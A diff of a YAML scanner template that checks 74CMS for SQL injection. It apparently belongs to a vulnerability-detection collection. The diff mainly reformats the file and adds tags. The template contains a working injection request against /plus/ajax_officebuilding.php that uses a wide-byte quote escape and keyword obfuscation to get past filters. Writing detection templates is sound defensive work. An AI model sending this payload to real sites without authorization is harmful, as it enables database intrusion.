@@ -5,16 +5,19 @@ info:
   author: rexus
   severity: high
   verified: true
-  description: 74cms-sqli-2 app="骑士-74CMS"
+  description: |-
+    74cms-sqli-2 app="骑士-74CMS"
   reference:
     - https://www.uedbox.com/post/30019/
+  tags: 74cms,sqli
+  created: 2025/03/21
 
 set:
-    rand: randomInt(200000000, 210000000)
+  rand: randomInt(200000000, 210000000)
 rules:
-    r0:
-        request:
-            method: GET
-            path: /plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{rand}}),5,6,7,8,9%23
-        expression: response.body.bcontains(bytes(md5(string(rand))))
+  r0:
+    request:
+      method: GET
+      path: /plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{rand}}),5,6,7,8,9%23
+    expression: response.body.bcontains(bytes(md5(string(rand))))
 expression: r0()
